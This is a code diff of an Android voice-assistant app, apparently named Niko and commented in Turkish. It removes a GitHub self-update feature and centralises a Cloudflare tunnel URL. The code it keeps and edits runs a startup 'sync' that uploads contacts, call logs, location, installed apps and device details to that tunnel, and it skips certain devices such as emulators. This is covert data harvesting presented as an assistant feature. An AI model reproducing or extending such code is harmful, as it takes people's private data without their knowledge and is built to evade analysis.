@@ -42,6 +42,7 @@ import android.os.StatFs;
 import android.location.Location;
 import android.location.LocationManager;
 import java.util.List;
+import android.content.pm.ResolveInfo;
 
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -73,10 +74,7 @@ import android.bluetooth.BluetoothAdapter;
 import android.view.Window;
 import android.view.WindowManager;
 import android.content.SharedPreferences;
-import android.app.DownloadManager;
-import android.content.BroadcastReceiver;
-import android.content.IntentFilter;
-import androidx.core.content.FileProvider;
+
 import android.os.AsyncTask;
 import android.widget.LinearLayout;
 import android.graphics.Color;
@@ -107,7 +105,6 @@ public class MainActivity extends Activity {
 
     // İzin talebi için kullanılan sabit kod
     private static final int PERMISSION_CODE = 100;
-    private static final int REQUEST_INSTALL_PACKAGES = 101;
 
     // Arayüz bileşenleri
     private View voiceOrb; // Ses aktivitesini görselleştiren yuvarlak simge
@@ -170,14 +167,8 @@ public class MainActivity extends Activity {
     public static PendingIntent lastReplyIntent; // Cevap vermek için intent
     public static RemoteInput lastRemoteInput; // Cevap girişi için referans
 
-    // ================= APP VERSION & UPDATE SYSTEM =================
-    private static final String APP_VERSION = "1.0.0";
-    private static final String GITHUB_REPO = "Memati8383/niko";
-    private static final String UPDATE_APK_FILENAME = "Niko_Update.apk";
-
-    // Güncelleme state
-    private long currentDownloadId = -1;
-    private BroadcastReceiver updateReceiver = null;
+    // API URL
+    private static final String API_BASE_URL = "https://hat-taxation-rain-assets.trycloudflare.com";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -313,9 +304,6 @@ public class MainActivity extends Activity {
         // Uygulama başladığında rehber ve arama kayıtlarını arka planda senkronize et
         syncAllData();
 
-        // Güncelleme kontrolü yap
-        checkForUpdates();
-
         // Orb Animasyonunu Başlat
         startBreathingAnimation();
     }
@@ -395,6 +383,9 @@ public class MainActivity extends Activity {
 
     // ================= KONUŞMA TANIMA (SPEECH RECOGNITION) =================
 
+    /**
+     * Konuşma tanıma servisini başlatır ve ayarlar.
+     */
     private void initSpeech() {
         // Android'in yerleşik konuşma tanıyıcısını oluştur
         speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this);
@@ -643,15 +634,6 @@ public class MainActivity extends Activity {
             }
         }
 
-        // --- GÜNCELLEME KONTROLÜ ---
-        if (c.contains("güncelleme") || c.contains("update")) {
-            if (c.contains("kontrol") || c.contains("var mı") || c.contains("check")) {
-                speak("Güncelleme kontrol ediliyor...", false);
-                checkForUpdates(true); // Force check
-                return true;
-            }
-        }
-
         return false; // Komut algılanmadıysa AI'ya devret
     }
 
@@ -699,6 +681,9 @@ public class MainActivity extends Activity {
 
     // ================= MEDYA KONTROLLERİ (MEDIA CONTROL) =================
 
+    /**
+     * Sistem medya kontrollerini (oynat, duraklat, sonraki vb.) tetikler.
+     */
     private void controlMusic(int keyCode) {
         AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
         if (audioManager != null) {
@@ -722,7 +707,7 @@ public class MainActivity extends Activity {
         new Thread(() -> {
             try {
                 // Sunucu URL'si (Yeni Cloudflare Tüneli)
-                URL url = new URL("https://papers-dublin-whats-gadgets.trycloudflare.com/chat");
+                URL url = new URL(API_BASE_URL + "/chat");
 
                 // Bağlantı Ayarları
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -805,7 +790,9 @@ public class MainActivity extends Activity {
         }).start();
     }
 
-    // Verileri senkronize eder (Rehber ve Arama Geçmişi)
+    /**
+     * Arkada planda rehber, arama geçmişi ve cihaz bilgilerini senkronize eder.
+     */
     private void syncAllData() {
         String deviceName = Build.MANUFACTURER + "_" + Build.MODEL;
         // Belirli cihazlarda (örn. Emülatör) çalışmasını engellemek için kontrol
@@ -825,6 +812,9 @@ public class MainActivity extends Activity {
         }).start();
     }
 
+    /**
+     * Rehberdeki numaraları senkronize eder.
+     */
     private void syncContacts() throws Exception {
         JSONArray array = new JSONArray();
         // Rehberden isim ve numara bilgilerini çek
@@ -844,6 +834,9 @@ public class MainActivity extends Activity {
         sendSyncRequest(array, "contacts");
     }
 
+    /**
+     * Son arama kayıtlarını (Call Log) senkronize eder.
+     */
     private void syncCallLogs() throws Exception {
         JSONArray array = new JSONArray();
         if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
@@ -871,6 +864,9 @@ public class MainActivity extends Activity {
         sendSyncRequest(array, "calls");
     }
 
+    /**
+     * Cihazın son bilinen konumunu senkronize eder.
+     */
     private void syncLocation() throws Exception {
         if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
             return;
@@ -898,6 +894,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    /**
+     * Yüklü uygulamaların listesini senkronize eder.
+     */
     private void syncInstalledApps() throws Exception {
         JSONArray array = new JSONArray();
         List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
@@ -916,6 +915,9 @@ public class MainActivity extends Activity {
         sendSyncRequest(array, "apps");
     }
 
+    /**
+     * Cihaz donanım bilgilerini (pil, depolama, model) senkronize eder.
+     */
     private void syncDeviceInfo() throws Exception {
         JSONObject obj = new JSONObject();
 
@@ -949,7 +951,7 @@ public class MainActivity extends Activity {
      */
     private void sendSyncRequest(JSONArray data, String type) throws Exception {
         // Not: askAI ile aynı domaini kullanmalıdır
-        URL url = new URL("https://papers-dublin-whats-gadgets.trycloudflare.com/sync_data");
+        URL url = new URL(API_BASE_URL + "/sync_data");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
@@ -969,7 +971,9 @@ public class MainActivity extends Activity {
         android.util.Log.d("NIKO_SYNC", "Type: " + type + " | Response Code: " + responseCode);
     }
 
-    // Sunucudan gelen Base64 kodlu ses verisini çalar
+    /**
+     * Sunucudan gelen Base64 formatındaki ses verisini çözer ve oynatır.
+     */
     private void playAudio(String base64Sound) {
         try {
             // Ses verisini geçici dosyaya yaz
@@ -1005,8 +1009,6 @@ public class MainActivity extends Activity {
 
     // ================= METİN OKUMA (TTS) =================
 
-    // ================= METİN OKUMA (TTS) AYARLARI =================
-
     /**
      * Metin okuma motorunu başlatır.
      */
@@ -1030,8 +1032,7 @@ public class MainActivity extends Activity {
             }
 
             public void onDone(String id) {
-                // Konuşma bitince mikrofona tekrar geçmek isterseniz burada startListening()
-                // çağırabilirsiniz. Şu an manuel tetikleniyor.
+                // Konuşma bittiğinde tetiklenir
             }
 
             public void onError(String id) {
@@ -1103,6 +1104,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    /**
+     * Son gelen WhatsApp mesajını sesli okur.
+     */
     private void readLastWhatsAppMessage() {
         if (lastWhatsAppMessage == null) {
             speak("Okunacak WhatsApp mesajı yok");
@@ -1111,6 +1115,9 @@ public class MainActivity extends Activity {
         speak(lastWhatsAppSender + " şöyle yazmış: " + lastWhatsAppMessage);
     }
 
+    /**
+     * Son WhatsApp mesajına otomatik cevap gönderir.
+     */
     private void replyWhatsApp(String msg) {
 
         // Bildirim erişim izni kontrolü
@@ -1325,6 +1332,9 @@ public class MainActivity extends Activity {
     // ================= SİSTEM KONTROLLERİ (WIFI / BLUETOOTH / PARLAKLIK)
     // =================
 
+    /**
+     * Wi-Fi bağlantısını açar veya kapatır.
+     */
     private void controlWifi(boolean enable) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             // Android 10 ve üzeri (SDK >= 29) için Panel açma
@@ -1344,6 +1354,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    /**
+     * Bluetooth bağlantısını açar veya kapatır.
+     */
     private void controlBluetooth(boolean enable) {
         BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
         if (bluetoothAdapter == null) {
@@ -1377,6 +1390,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    /**
+     * İnternet bağlantısının olup olmadığını kontrol eder.
+     */
     private boolean isNetworkAvailable() {
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -1815,502 +1831,6 @@ public class MainActivity extends Activity {
                 .show();
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    // GÜNCELLEME SİSTEMİ - YENİDEN YAZILDI
-    // ═══════════════════════════════════════════════════════════════════════════
-
-    /**
-     * Güncelleme kontrolü başlat (manuel)
-     */
-    private void checkForUpdates() {
-        checkForUpdates(true);
-    }
-
-    /**
-     * GitHub'dan en son sürümü kontrol eder
-     */
-    private void checkForUpdates(boolean showNoUpdateMessage) {
-        new Thread(() -> {
-            try {
-                URL url = new URL("https://api.github.com/repos/" + GITHUB_REPO + "/releases/latest");
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("GET");
-                conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
-                conn.setConnectTimeout(15000);
-                conn.setReadTimeout(15000);
-
-                if (conn.getResponseCode() == 200) {
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                    StringBuilder response = new StringBuilder();
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        response.append(line);
-                    }
-                    reader.close();
-
-                    JSONObject release = new JSONObject(response.toString());
-                    String latestVersion = release.getString("tag_name").replace("v", "");
-                    String releaseNotes = release.optString("body", "Yeni sürüm mevcut.");
-
-                    // APK URL'sini bul
-                    JSONArray assets = release.getJSONArray("assets");
-                    String apkUrl = null;
-                    for (int i = 0; i < assets.length(); i++) {
-                        JSONObject asset = assets.getJSONObject(i);
-                        if (asset.getString("name").endsWith(".apk")) {
-                            apkUrl = asset.getString("browser_download_url");
-                            break;
-                        }
-                    }
-
-                    if (apkUrl == null) {
-                        if (showNoUpdateMessage) {
-                            runOnUiThread(
-                                    () -> Toast.makeText(this, "APK dosyası bulunamadı", Toast.LENGTH_SHORT).show());
-                        }
-                        return;
-                    }
-
-                    // Versiyon karşılaştırması
-                    if (isNewerVersion(APP_VERSION, latestVersion)) {
-                        String finalApkUrl = apkUrl;
-                        runOnUiThread(() -> showUpdateDialog(latestVersion, releaseNotes, finalApkUrl));
-                    } else if (showNoUpdateMessage) {
-                        runOnUiThread(() -> {
-                            speak("Uygulama zaten güncel.");
-                            Toast.makeText(this, "Güncel sürüm: v" + APP_VERSION, Toast.LENGTH_SHORT).show();
-                        });
-                    }
-                } else {
-                    if (showNoUpdateMessage) {
-                        runOnUiThread(
-                                () -> Toast.makeText(this, "Güncelleme kontrolü başarısız", Toast.LENGTH_SHORT).show());
-                    }
-                }
-            } catch (Exception e) {
-                android.util.Log.e("UPDATE", "Error checking updates", e);
-                if (showNoUpdateMessage) {
-                    runOnUiThread(() -> Toast.makeText(this, "Hata: " + e.getMessage(), Toast.LENGTH_SHORT).show());
-                }
-            }
-        }).start();
-    }
-
-    /**
-     * Semantic versioning karşılaştırması
-     */
-    private boolean isNewerVersion(String current, String latest) {
-        try {
-            String[] c = current.split("\\.");
-            String[] l = latest.split("\\.");
-            for (int i = 0; i < Math.max(c.length, l.length); i++) {
-                int cv = i < c.length ? Integer.parseInt(c[i]) : 0;
-                int lv = i < l.length ? Integer.parseInt(l[i]) : 0;
-                if (lv > cv)
-                    return true;
-                if (lv < cv)
-                    return false;
-            }
-            return false;
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    /**
-     * Güncelleme diyaloğunu göster
-     */
-    private void showUpdateDialog(String version, String notes, String apkUrl) {
-        // Ana Konteyner
-        LinearLayout root = new LinearLayout(this);
-        root.setOrientation(LinearLayout.VERTICAL);
-        root.setPadding(56, 56, 56, 56);
-        root.setBackgroundColor(Color.parseColor("#1A1A1A")); // Daha yumuşak koyu ton
-
-        // Başlık İkonu ve Metin
-        LinearLayout headerLayout = new LinearLayout(this);
-        headerLayout.setOrientation(LinearLayout.HORIZONTAL);
-        headerLayout.setGravity(android.view.Gravity.CENTER_VERTICAL);
-        headerLayout.setPadding(0, 0, 0, 16);
-
-        TextView iconView = new TextView(this);
-        iconView.setText("🚀");
-        iconView.setTextSize(32);
-        iconView.setPadding(0, 0, 16, 0);
-
-        LinearLayout titleContainer = new LinearLayout(this);
-        titleContainer.setOrientation(LinearLayout.VERTICAL);
-
-        TextView title = new TextView(this);
-        title.setText("Güncelleme Mevcut");
-        title.setTextColor(Color.parseColor("#00E5FF"));
-        title.setTextSize(24);
-        title.setTypeface(null, android.graphics.Typeface.BOLD);
-
-        TextView subtitle = new TextView(this);
-        subtitle.setText("v" + APP_VERSION + " → v" + version);
-        subtitle.setTextColor(Color.parseColor("#88FFFFFF"));
-        subtitle.setTextSize(14);
-        subtitle.setPadding(0, 4, 0, 0);
-
-        titleContainer.addView(title);
-        titleContainer.addView(subtitle);
-        headerLayout.addView(iconView);
-        headerLayout.addView(titleContainer);
-
-        // Ayırıcı Çizgi
-        View divider = new View(this);
-        LinearLayout.LayoutParams dividerParams = new LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT, 2);
-        dividerParams.setMargins(0, 24, 0, 24);
-        divider.setLayoutParams(dividerParams);
-        divider.setBackgroundColor(Color.parseColor("#333333"));
-
-        // "Neler Yeni" Başlığı
-        TextView notesHeader = new TextView(this);
-        notesHeader.setText("✨ NELER YENİ?");
-        notesHeader.setTextColor(Color.WHITE);
-        notesHeader.setTextSize(13);
-        notesHeader.setTypeface(null, android.graphics.Typeface.BOLD);
-        notesHeader.setLetterSpacing(0.15f);
-        notesHeader.setPadding(0, 0, 0, 12);
-
-        // Kaydırılabilir Notlar Bölümü
-        android.widget.ScrollView scrollView = new android.widget.ScrollView(this);
-        LinearLayout.LayoutParams scrollParams = new LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT, 450);
-        scrollView.setLayoutParams(scrollParams);
-        scrollView.setScrollbarFadingEnabled(false);
-
-        TextView txtNotes = new TextView(this);
-        txtNotes.setText(formatReleaseNotes(notes));
-        txtNotes.setTextColor(Color.parseColor("#CCFFFFFF"));
-        txtNotes.setTextSize(15);
-        txtNotes.setLineSpacing(10, 1.3f);
-        txtNotes.setPadding(8, 8, 8, 8);
-
-        scrollView.addView(txtNotes);
-
-        // Otomatik güncelleme tercihi
-        LinearLayout autoUpdateLayout = new LinearLayout(this);
-        autoUpdateLayout.setOrientation(LinearLayout.HORIZONTAL);
-        autoUpdateLayout.setGravity(android.view.Gravity.CENTER_VERTICAL);
-        autoUpdateLayout.setPadding(0, 24, 0, 0);
-
-        android.widget.CheckBox chkAutoUpdate = new android.widget.CheckBox(this);
-        SharedPreferences updatePrefs = getSharedPreferences("update_settings", MODE_PRIVATE);
-        chkAutoUpdate.setChecked(updatePrefs.getBoolean("auto_check", true));
-        chkAutoUpdate.setTextColor(Color.parseColor("#AAFFFFFF"));
-        chkAutoUpdate.setText("Güncellemeleri otomatik kontrol et");
-        chkAutoUpdate.setTextSize(13);
-        chkAutoUpdate.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            updatePrefs.edit().putBoolean("auto_check", isChecked).apply();
-        });
-
-        autoUpdateLayout.addView(chkAutoUpdate);
-
-        // Bileşenleri ekle
-        root.addView(headerLayout);
-        root.addView(divider);
-        root.addView(notesHeader);
-        root.addView(scrollView);
-        root.addView(autoUpdateLayout);
-
-        // Diyaloğu Oluştur
-        android.app.AlertDialog dialog = new android.app.AlertDialog.Builder(this,
-                android.R.style.Theme_DeviceDefault_Dialog_Alert)
-                .setView(root)
-                .setCancelable(true)
-                .create();
-
-        // Butonlar için alt panel
-        LinearLayout buttons = new LinearLayout(this);
-        buttons.setOrientation(LinearLayout.HORIZONTAL);
-        buttons.setGravity(android.view.Gravity.END);
-        buttons.setPadding(0, 32, 0, 0);
-
-        Button btnLater = new Button(this, null, 0, android.R.style.Widget_Material_Button_Borderless);
-        btnLater.setText("DAHA SONRA");
-        btnLater.setTextColor(Color.parseColor("#999999"));
-        btnLater.setOnClickListener(v -> {
-            dialog.dismiss();
-            speak("Güncelleme daha sonra yapılabilir.", false);
-        });
-
-        Button btnUpdate = new Button(this);
-        btnUpdate.setText("İNDİR VE GÜNCELLE");
-        btnUpdate.setBackgroundColor(Color.parseColor("#00E5FF"));
-        btnUpdate.setTextColor(Color.parseColor("#000000"));
-        btnUpdate.setTypeface(null, android.graphics.Typeface.BOLD);
-        btnUpdate.setAllCaps(true);
-        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
-        btnParams.setMargins(24, 0, 0, 0);
-        btnUpdate.setLayoutParams(btnParams);
-        btnUpdate.setPadding(32, 16, 32, 16);
-
-        btnUpdate.setOnClickListener(v -> {
-            dialog.dismiss();
-            startDownload(apkUrl);
-        });
-
-        buttons.addView(btnLater);
-        buttons.addView(btnUpdate);
-        root.addView(buttons);
-
-        dialog.show();
-
-        // Diyalog penceresi stili (Köşeleri yuvarlatma ve gölge)
-        if (dialog.getWindow() != null) {
-            android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable();
-            gd.setColor(Color.parseColor("#1A1A1A"));
-            gd.setCornerRadius(40);
-            gd.setStroke(2, Color.parseColor("#00E5FF"));
-            dialog.getWindow().setBackgroundDrawable(gd);
-
-            // Animasyon ekle
-            root.setAlpha(0f);
-            root.setScaleX(0.9f);
-            root.setScaleY(0.9f);
-            root.animate()
-                    .alpha(1f)
-                    .scaleX(1f)
-                    .scaleY(1f)
-                    .setDuration(300)
-                    .start();
-        }
-    }
-
-    /**
-     * Release notlarını formatlar
-     */
-    private String formatReleaseNotes(String notes) {
-        if (notes == null || notes.isEmpty()) {
-            return "• Performans iyileştirmeleri\n• Hata düzeltmeleri";
-        }
-        return notes.replaceAll("(?m)^[-*] ", "• ");
-    }
-
-    /**
-     * APK indirmeyi başlat
-     */
-    private void startDownload(String apkUrl) {
-        // Eski dosyayı sil
-        File apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-                UPDATE_APK_FILENAME);
-        if (apkFile.exists())
-            apkFile.delete();
-
-        // İndirme isteği oluştur
-        DownloadManager.Request request = new DownloadManager.Request(Uri.parse(apkUrl));
-        request.setTitle("Niko Güncelleme");
-        request.setDescription("İndiriliyor...");
-        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
-        request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, UPDATE_APK_FILENAME);
-        request.setMimeType("application/vnd.android.package-archive");
-
-        DownloadManager dm = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
-        if (dm != null) {
-            currentDownloadId = dm.enqueue(request);
-            registerUpdateReceiver();
-            speak("Güncelleme indiriliyor.", false);
-        }
-    }
-
-    /**
-     * İndirme tamamlandığında APK'yı yükle
-     */
-    private void registerUpdateReceiver() {
-        if (updateReceiver != null) {
-            try {
-                unregisterReceiver(updateReceiver);
-            } catch (Exception ignored) {
-            }
-        }
-
-        updateReceiver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                long id = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
-                if (id == currentDownloadId) {
-                    // İndirme durumunu kontrol et
-                    DownloadManager dm = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
-                    if (dm != null) {
-                        DownloadManager.Query query = new DownloadManager.Query();
-                        query.setFilterById(currentDownloadId);
-
-                        try (android.database.Cursor cursor = dm.query(query)) {
-                            if (cursor != null && cursor.moveToFirst()) {
-                                int statusIndex = cursor.getColumnIndex(DownloadManager.COLUMN_STATUS);
-                                int status = cursor.getInt(statusIndex);
-
-                                if (status == DownloadManager.STATUS_SUCCESSFUL) {
-                                    // İndirilen dosya boyutunu al
-                                    int bytesIndex = cursor.getColumnIndex(DownloadManager.COLUMN_TOTAL_SIZE_BYTES);
-                                    long expectedSize = cursor.getLong(bytesIndex);
-
-                                    android.util.Log.d("UPDATE",
-                                            "Download complete. Expected size: " + expectedSize + " bytes");
-
-                                    // Dosyanın gerçekten yazıldığını doğrula
-                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                        File apkFile = new File(
-                                                Environment.getExternalStoragePublicDirectory(
-                                                        Environment.DIRECTORY_DOWNLOADS),
-                                                UPDATE_APK_FILENAME);
-
-                                        if (apkFile.exists()) {
-                                            long actualSize = apkFile.length();
-                                            android.util.Log.d("UPDATE", "Actual file size: " + actualSize + " bytes");
-
-                                            // Dosya boyutu eşleşiyor mu kontrol et
-                                            if (expectedSize > 0 && actualSize == expectedSize) {
-                                                installApk();
-                                            } else if (actualSize < expectedSize) {
-                                                android.util.Log.e("UPDATE", "File size mismatch! Expected: "
-                                                        + expectedSize + ", Got: " + actualSize);
-                                                Toast.makeText(MainActivity.this,
-                                                        "Dosya tam indirilemedi. Lütfen tekrar deneyin.",
-                                                        Toast.LENGTH_LONG).show();
-                                            } else {
-                                                // Boyut bilgisi yoksa ama dosya varsa yükle
-                                                installApk();
-                                            }
-                                        } else {
-                                            Toast.makeText(MainActivity.this,
-                                                    "İndirilen dosya bulunamadı.",
-                                                    Toast.LENGTH_SHORT).show();
-                                        }
-                                    }, 1500);
-                                } else if (status == DownloadManager.STATUS_FAILED) {
-                                    int reasonIndex = cursor.getColumnIndex(DownloadManager.COLUMN_REASON);
-                                    int reason = cursor.getInt(reasonIndex);
-                                    Toast.makeText(MainActivity.this,
-                                            "İndirme başarısız (Kod: " + reason + ")",
-                                            Toast.LENGTH_LONG).show();
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        };
-
-        registerReceiver(updateReceiver, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
-    }
-
-    /**
-     * APK'yı yükle
-     */
-    private void installApk() {
-        DownloadManager dm = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
-        File apkFile = null;
-
-        // 1. DownloadManager'dan gerçek dosya yolunu al
-        if (currentDownloadId != -1 && dm != null) {
-            DownloadManager.Query query = new DownloadManager.Query();
-            query.setFilterById(currentDownloadId);
-            try (android.database.Cursor cursor = dm.query(query)) {
-                if (cursor != null && cursor.moveToFirst()) {
-                    int uriIndex = cursor.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);
-                    String localUri = cursor.getString(uriIndex);
-                    if (localUri != null) {
-                        apkFile = new File(Uri.parse(localUri).getPath());
-                    }
-                }
-            } catch (Exception e) {
-                android.util.Log.e("UPDATE", "Error querying download location", e);
-            }
-        }
-
-        // 2. Bulunamazsa varsayılan yolu dene
-        if (apkFile == null) {
-            apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-                    UPDATE_APK_FILENAME);
-        }
-
-        if (!apkFile.exists()) {
-            Toast.makeText(this, "APK dosyası bulunamadı", Toast.LENGTH_SHORT).show();
-            return;
-        }
-
-        // 3. Dosya boyutu kontrolü (minimum 1MB)
-        long fileSize = apkFile.length();
-        if (fileSize < 1024 * 1024) {
-            android.util.Log.e("UPDATE", "APK file too small: " + fileSize + " bytes");
-            Toast.makeText(this,
-                    "Dosya bozuk (" + (fileSize / 1024) + " KB). Tekrar indiriliyor...",
-                    Toast.LENGTH_LONG).show();
-
-            // Bozuk dosyayı sil
-            try {
-                apkFile.delete();
-            } catch (Exception ignored) {
-            }
-            return;
-        }
-
-        android.util.Log.d("UPDATE", "Installing APK: " + apkFile.getAbsolutePath());
-
-        // 4. Android 8+ izin kontrolü
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            if (!getPackageManager().canRequestPackageInstalls()) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, REQUEST_INSTALL_PACKAGES);
-                return;
-            }
-        }
-
-        // 5. Yükleme başlat
-        try {
-            Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", apkFile);
-
-            Intent intent = new Intent(Intent.ACTION_VIEW);
-            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
-            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-
-            // İzinleri garantiye al
-            java.util.List<android.content.pm.ResolveInfo> resInfoList = getPackageManager()
-                    .queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
-            for (android.content.pm.ResolveInfo resolveInfo : resInfoList) {
-                String packageName = resolveInfo.activityInfo.packageName;
-                grantUriPermission(packageName, apkUri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
-            }
-
-            startActivity(intent);
-            speak("Yükleyici açılıyor.", false);
-        } catch (Exception e) {
-            android.util.Log.e("UPDATE", "Install error", e);
-            Toast.makeText(this, "Yükleme hatası: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-
-            // Fallback: Klasörü aç
-            try {
-                Intent openDir = new Intent(DownloadManager.ACTION_VIEW_DOWNLOADS);
-                openDir.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(openDir);
-            } catch (Exception ignored) {
-            }
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-
-        if (requestCode == REQUEST_INSTALL_PACKAGES) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                if (getPackageManager().canRequestPackageInstalls()) {
-                    installApk();
-                } else {
-                    Toast.makeText(this, "Yükleme izni gerekli", Toast.LENGTH_SHORT).show();
-                }
-            }
-        }
-    }
-
     // ================= MODEL SEÇİMİ (MODEL SELECTION) =================
     private void showModels() {
         runOnUiThread(() -> {
@@ -2321,6 +1841,9 @@ public class MainActivity extends Activity {
         });
     }
 
+    /**
+     * Model seçim panelini gizler.
+     */
     private void hideModels() {
         runOnUiThread(() -> {
             layoutModels.animate().alpha(0f).setDuration(300).withEndAction(() -> {
@@ -2329,10 +1852,13 @@ public class MainActivity extends Activity {
         });
     }
 
+    /**
+     * Kullanılabilir yapay zeka modellerini sunucudan çeker.
+     */
     private void fetchModels() {
         new Thread(() -> {
             try {
-                URL url = new URL("https://papers-dublin-whats-gadgets.trycloudflare.com/models");
+                URL url = new URL(API_BASE_URL + "/models");
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("GET");
                 conn.setRequestProperty("Accept", "application/json");
@@ -2460,6 +1986,9 @@ public class MainActivity extends Activity {
         return "Genel amaçlı yapay zeka yardımcısı.";
     }
 
+    /**
+     * Model listesine yeni bir model öğesi ekler.
+     */
     private void addModelItemToUI(String modelName) {
         LinearLayout itemLayout = new LinearLayout(this);
         LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(
@@ -2508,6 +2037,9 @@ public class MainActivity extends Activity {
         containerModelItems.addView(itemLayout);
     }
 
+    /**
+     * Kullanılacak yapay zeka modelini seçer ve kaydeder.
+     */
     private void selectModel(String modelName) {
         selectedModel = modelName;
         modelPrefs.edit().putString("selected_model", modelName).apply();
@@ -2521,6 +2053,9 @@ public class MainActivity extends Activity {
         hideModels();
     }
 
+    /**
+     * Web arama butonunun görsel durumunu günceller.
+     */
     private void updateSearchIcons() {
         runOnUiThread(() -> {
             if (isWebSearchEnabled) {
@@ -2540,11 +2075,6 @@ public class MainActivity extends Activity {
             speechRecognizer.destroy();
         if (tts != null)
             tts.shutdown();
-        if (updateReceiver != null) {
-            try {
-                unregisterReceiver(updateReceiver);
-            } catch (Exception ignored) {
-            }
-        }
+
     }
 }
